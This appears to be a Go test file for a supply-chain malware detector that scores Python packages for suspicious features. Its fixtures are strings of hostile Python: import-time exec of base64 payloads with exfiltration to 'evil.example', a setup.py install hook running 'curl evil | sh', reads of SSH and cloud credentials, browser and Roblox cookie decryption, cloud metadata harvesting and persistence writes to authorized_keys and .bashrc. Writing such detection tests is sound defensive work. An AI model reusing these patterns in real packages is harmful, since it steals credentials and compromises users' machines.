package python

import (
	"context"
	"errors"
	"iter"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/signal/source/astfeature"
)

// seq builds an iter.Seq2 from explicit (file, err) pairs so tests
// can drive the analyzer's stream-error and drain behavior exactly.
func seq(pairs ...struct {
	f   astfeature.SourceFile
	err error
}) iter.Seq2[astfeature.SourceFile, error] {
	return func(yield func(astfeature.SourceFile, error) bool) {
		for _, p := range pairs {
			if !yield(p.f, p.err) {
				return
			}
		}
	}
}

type fe = struct {
	f   astfeature.SourceFile
	err error
}

func TestAnalyzer_Analyze_CleanFileHasZeroCounts(t *testing.T) {
	t.Parallel()
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "pkg/core.py", Content: []byte(
			"import json\n\n\ndef parse(s):\n    return json.loads(s)\n")}},
	))
	require.NoError(t, err)
	assert.Equal(t, astfeature.Counts{}, counts,
		"a benign module that only defines functions must spike nothing")
}

// TestAnalyzer_Analyze_WeaponizedInitPayload is the load-bearing
// adversarial fixture: the dominant real PyPI supply-chain shape —
// exec(base64.b64decode(...)) plus network exfil running at import
// time in __init__.py. Every counted field must light up; the def
// body must NOT inflate ImportTimeCallSites.
func TestAnalyzer_Analyze_WeaponizedInitPayload(t *testing.T) {
	t.Parallel()
	src := "" +
		"import os\n" +
		"import base64\n" +
		"import urllib.request\n" +
		"exec(base64.b64decode('aW1wb3J0IG9z'))\n" +
		"urllib.request.urlopen('http://evil.example/exfil')\n" +
		"os.system('id')\n" +
		"key = 0x42\n" +
		"key ^= 0x37\n" +
		"def helper():\n" +
		"    eval('2')\n" // nested: counts in DynamicEvalCalls, NOT import-time
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "pkg/__init__.py", Content: []byte(src)}},
	))
	require.NoError(t, err)

	assert.Equal(t, 2, counts.DynamicEvalCalls, "exec(...) at module scope + eval(...) in helper")
	assert.Equal(t, 1, counts.Base64DecodeCalls, "base64.b64decode")
	assert.Equal(t, 1, counts.NetworkCallSites, "urllib.request.urlopen")
	assert.Equal(t, 1, counts.ExecCalls, "os.system")
	assert.Equal(t, 1, counts.XORAssignments, "key ^= 0x37")
	assert.Equal(t, 4, counts.ImportTimeCallSites,
		"module-scope calls: exec, base64.b64decode, urllib.request.urlopen, os.system "+
			"(eval in helper() is NOT import-time)")
	assert.Equal(t, 0, counts.InitCount,
		"InitCount stays Go-only; Python import-time surface is ImportTimeCallSites")
}

func TestAnalyzer_Analyze_DynamicEvalIsBareBuiltinOnly(t *testing.T) {
	t.Parallel()
	// re.compile / obj.eval / self.exec are benign method/attribute
	// calls that merely share a name with the builtins. Only the
	// bare builtin (or explicit builtins.* / __import__) is
	// code-from-data execution. Miscounting re.compile would spike
	// dynamic_eval_calls on the first regex a package adds.
	src := "" +
		"import re\n" +
		"PATTERN = re.compile('x')\n" + // NOT dynamic eval
		"q = session.query(M).eval()\n" + // NOT dynamic eval
		"exec(payload)\n" + // dynamic eval
		"compile(src, '<s>', 'exec')\n" + // dynamic eval (bare builtin)
		"__import__('os')\n" // dynamic eval
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "m.py", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 3, counts.DynamicEvalCalls,
		"only bare exec / compile / __import__ — not re.compile or .eval()")
}

// TestAnalyzer_Analyze_SetupPyInstallHook: the most iconic PyPI
// vector — a setup.py that subclasses a setuptools/distutils install
// command so arbitrary code runs at `pip install`. The payload is in
// a method body, invisible to import-time call counting; the
// structural tell is the command-class subclass in setup.py.
func TestAnalyzer_Analyze_SetupPyInstallHook(t *testing.T) {
	t.Parallel()
	malicious := "" +
		"from setuptools import setup\n" +
		"from setuptools.command.install import install\n" +
		"import os\n" +
		"class _PostInstall(install):\n" +
		"    def run(self):\n" +
		"        os.system('curl evil | sh')\n" +
		"        install.run(self)\n" +
		"setup(name='x', cmdclass={'install': _PostInstall})\n"

	t.Run("flags in setup.py", func(t *testing.T) {
		t.Parallel()
		a := NewAnalyzer()
		c, err := a.Analyze(t.Context(), seq(
			fe{f: astfeature.SourceFile{Path: "setup.py", Content: []byte(malicious)}},
		))
		require.NoError(t, err)
		assert.Equal(t, 1, c.InstallHookOverrides,
			"a command-class subclass in setup.py is an install-time hook")
	})

	t.Run("ignored outside setup.py", func(t *testing.T) {
		t.Parallel()
		a := NewAnalyzer()
		c, err := a.Analyze(t.Context(), seq(
			fe{f: astfeature.SourceFile{Path: "pkg/cli.py", Content: []byte(malicious)}},
		))
		require.NoError(t, err)
		assert.Equal(t, 0, c.InstallHookOverrides,
			"subclassing install outside setup.py is not the install-hook vector")
	})

	t.Run("benign declarative setup.py", func(t *testing.T) {
		t.Parallel()
		a := NewAnalyzer()
		c, err := a.Analyze(t.Context(), seq(
			fe{f: astfeature.SourceFile{Path: "setup.py", Content: []byte(
				"from setuptools import setup, find_packages\n" +
					"setup(name='x', packages=find_packages())\n")}},
		))
		require.NoError(t, err)
		assert.Equal(t, 0, c.InstallHookOverrides,
			"an ordinary declarative setup.py must not flag")
	})
}

// TestAnalyzer_Analyze_PayloadDecodeCatalog: obfuscated payloads
// arrive hex- or zlib/lzma/gzip-compressed as often as base64. The
// Base64DecodeCalls field is "opaque payload decode" by intent —
// broaden it. json.dumps / plain str ops must not count.
func TestAnalyzer_Analyze_PayloadDecodeCatalog(t *testing.T) {
	t.Parallel()
	src := "" +
		"import binascii, zlib, lzma, gzip, json\n" +
		"binascii.unhexlify(p)\n" +
		"bytes.fromhex(p)\n" +
		"zlib.decompress(p)\n" +
		"lzma.decompress(p)\n" +
		"gzip.decompress(p)\n" +
		"json.dumps(p)\n" // benign
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "m.py", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 5, counts.Base64DecodeCalls,
		"unhexlify + fromhex + zlib/lzma/gzip.decompress — json.dumps must not")
}

// TestAnalyzer_Analyze_DeserializationSinks: pickle/marshal/dill
// loads and yaml.load(without SafeLoader) are arbitrary-code-
// execution on untrusted data — the same code-from-data threat
// class as exec, so they fold into DynamicEvalCalls. json.loads and
// yaml.safe_load are benign and must not count.
func TestAnalyzer_Analyze_DeserializationSinks(t *testing.T) {
	t.Parallel()
	src := "" +
		"import pickle, marshal, json, yaml\n" +
		"pickle.loads(blob)\n" + // RCE
		"marshal.loads(blob)\n" + // RCE
		"yaml.load(text)\n" + // RCE (no SafeLoader)
		"json.loads(text)\n" + // benign
		"yaml.safe_load(text)\n" + // benign
		"obj.loads(x)\n" // benign (arbitrary method named loads)
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "m.py", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 3, counts.DynamicEvalCalls,
		"pickle.loads + marshal.loads + yaml.load — json.loads, yaml.safe_load, obj.loads must not")
}

// TestAnalyzer_Analyze_CredentialHarvest is the adversarial fixture
// for the dominant *modern* PyPI payload class: reading SSH keys,
// cloud credentials, and .netrc for exfil. Only resolvable sensitive
// paths through a read sink count; benign opens and unresolved
// (runtime-dependent) paths must not — a conservative miss beats a
// false anomaly.
func TestAnalyzer_Analyze_CredentialHarvest(t *testing.T) {
	t.Parallel()
	src := "" +
		"import os, io\n" +
		"open(os.path.expanduser('~/.ssh/id_rsa'))\n" + // sensitive
		"open('/home/u/.aws/credentials')\n" + // sensitive
		"io.open(os.path.join(os.path.expanduser('~'), '.netrc'))\n" + // sensitive
		"open('config.json')\n" + // benign
		"open(user_supplied_path)\n" + // unresolved
		"open(f'{base}/.ssh/id_rsa')\n" // unresolved (f-string)
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "stealer.py", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 3, counts.SensitivePathReads,
		"~/.ssh/id_rsa, ~/.aws/credentials, ~/.netrc via open/io.open — "+
			"config.json + unresolved paths must not count")
}

func TestAnalyzer_Analyze_BenignOpensScoreZero(t *testing.T) {
	t.Parallel()
	src := "" +
		"open('README.md')\n" +
		"open('/var/log/app.log', 'a')\n" +
		"io.open('data/cache.bin', 'rb')\n"
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "ok.py", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 0, counts.SensitivePathReads,
		"ordinary file opens must never spike SensitivePathReads")
}

// TestAnalyzer_Analyze_CredentialDecryptCalls covers the DPAPI
// decryption primitive at the heart of every Windows browser/game
// cookie stealer (spadata, June 2026): after locating the encrypted
// store it calls CryptUnprotectData. win32crypt.*, the ctypes crypt32
// binding, and the bare from-import all resolve to the same Win32 API;
// an ordinary obj.decrypt / cipher.update must NOT count.
func TestAnalyzer_Analyze_CredentialDecryptCalls(t *testing.T) {
	t.Parallel()
	src := "" +
		"import win32crypt, ctypes\n" +
		"from win32crypt import CryptUnprotectData\n" +
		"win32crypt.CryptUnprotectData(blob)\n" + // qualified
		"ctypes.windll.crypt32.CryptUnprotectData(blob)\n" + // ctypes binding
		"CryptUnprotectData(blob)\n" + // bare from-import
		"obj.decrypt(x)\n" + // benign method — must NOT count
		"cipher.update(x)\n" // benign
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "stealer.py", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 3, counts.CredentialDecryptCalls,
		"win32crypt.* + ctypes crypt32 + bare CryptUnprotectData — not obj.decrypt / cipher.update")
}

// TestAnalyzer_Analyze_RobloxCookiePathIdioms is the P1 idiom matrix:
// real stealers build the cookie-store path several ways. Each must
// resolve to a sensitive path so SensitivePathReads fires. The join+
// environ / join+getenv rows exercise an unresolvable path prefix
// (os.environ[...] / os.getenv(...)) folded with literal segments — the
// dominant Windows-stealer shape.
func TestAnalyzer_Analyze_RobloxCookiePathIdioms(t *testing.T) {
	t.Parallel()
	cases := []struct{ name, expr string }{
		{"literal", `open(r"C:\Users\me\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")`},
		{"expandvars", `open(os.path.expandvars(r"%USERPROFILE%\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"))`},
		{"join+expanduser", `open(os.path.join(os.path.expanduser("~"), "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat"))`},
		{"join+environ", `open(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat"))`},
		{"join+getenv", `open(os.path.join(os.getenv("LOCALAPPDATA"), "Roblox", "LocalStorage", "robloxcookies.dat"))`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			a := NewAnalyzer()
			counts, err := a.Analyze(t.Context(), seq(
				fe{f: astfeature.SourceFile{Path: "stealer.py", Content: []byte("import os\n" + tc.expr + "\n")}},
			))
			require.NoError(t, err)
			assert.Equal(t, 1, counts.SensitivePathReads,
				"the Roblox cookie store must be detected via the %s idiom", tc.name)
		})
	}
}

// TestAnalyzer_Analyze_RobloxCookiePath_DocumentedGap pins the
// conservative miss: `+` concatenation (and a bare subscript prefix
// outside os.path.join) is not statically folded. Recorded so a future
// resolver improvement that closes it updates this test rather than
// silently changing behavior.
func TestAnalyzer_Analyze_RobloxCookiePath_DocumentedGap(t *testing.T) {
	t.Parallel()
	src := "import os\n" + `open(os.environ["USERPROFILE"] + r"\Roblox\LocalStorage\robloxcookies.dat")` + "\n"
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "stealer.py", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 0, counts.SensitivePathReads,
		"`+` concatenation is not folded (documented gap); os.path.join-wrapped forms ARE caught")
}

// TestAnalyzer_Analyze_CloudMetadataCalls: a network call whose
// statically-resolved destination is a cloud instance-metadata / SSRF-
// pivot endpoint is the credential-mint shape (TanStack/litellm IMDS
// harvest). It must count distinctly from generic egress — the
// destination class IS the signal. Brings Python to node's parity.
func TestAnalyzer_Analyze_CloudMetadataCalls(t *testing.T) {
	t.Parallel()
	src := "" +
		"import urllib.request, requests\n" +
		"urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/')\n" + // AWS IMDS
		"requests.get('https://metadata.google.internal/computeMetadata/v1/')\n" + // GCP metadata
		"requests.get('https://api.example.com/v1/users')\n" // benign egress
	c, err := NewAnalyzer().Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "m.py", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 2, c.CloudMetadataCalls, "AWS IMDS + GCP metadata destinations")
	assert.Equal(t, 1, c.NetworkCallSites, "only the api.example.com call is generic egress")
}

// TestAnalyzer_Analyze_SensitivePathWrites: writing to a persistence /
// credential-tamper location (~/.ssh/authorized_keys, shell rc) is the
// post-exploitation step in node-ipc / bufferzonecorp. In Python the
// write intent lives in open()'s MODE (2nd arg), so the analyzer must
// resolve it: a write-mode open of a persistence path counts as a
// write; a no-mode (read) open of a read-catalog path stays a read.
func TestAnalyzer_Analyze_SensitivePathWrites(t *testing.T) {
	t.Parallel()
	src := "" +
		"import os\n" +
		"open('/home/u/.bashrc', 'a').write(payload)\n" + // persistence append
		"open(os.path.expanduser('~/.ssh/authorized_keys'), 'w')\n" + // persistence write
		"open('/home/u/.aws/credentials')\n" + // no mode → sensitive READ, not write
		"open('output.log', 'w')\n" // benign write — neither catalog
	c, err := NewAnalyzer().Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "stealer.py", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 2, c.SensitivePathWrites,
		"~/.bashrc append + ~/.ssh/authorized_keys write — output.log is not a persistence path")
	assert.Equal(t, 1, c.SensitivePathReads,
		"~/.aws/credentials opened without a write mode stays a read")
}

func TestAnalyzer_Analyze_PropagatesUpstreamStreamError(t *testing.T) {
	t.Parallel()
	// Same contract as golang.Analyzer: a mid-stream provider error
	// (e.g. BlobStreamer blob-fetch failure) aborts with that error
	// rather than silently yielding empty counts, so the assembler
	// does not record a misleading all-zero row.
	wantErr := errors.New("blob fetch boom")
	a := NewAnalyzer()
	_, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "ok.py", Content: []byte("x = 1\n")}},
		fe{err: wantErr},
	))
	assert.ErrorIs(t, err, wantErr)
}

func TestAnalyzer_Analyze_HonorsContextCancellation(t *testing.T) {
	t.Parallel()
	a := NewAnalyzer()
	ctx, cancel := context.WithCancel(t.Context())
	cancel()
	_, err := a.Analyze(ctx, seq(
		fe{f: astfeature.SourceFile{Path: "a.py", Content: []byte("x = 1\n")}},
	))
	assert.ErrorIs(t, err, ctx.Err())
}
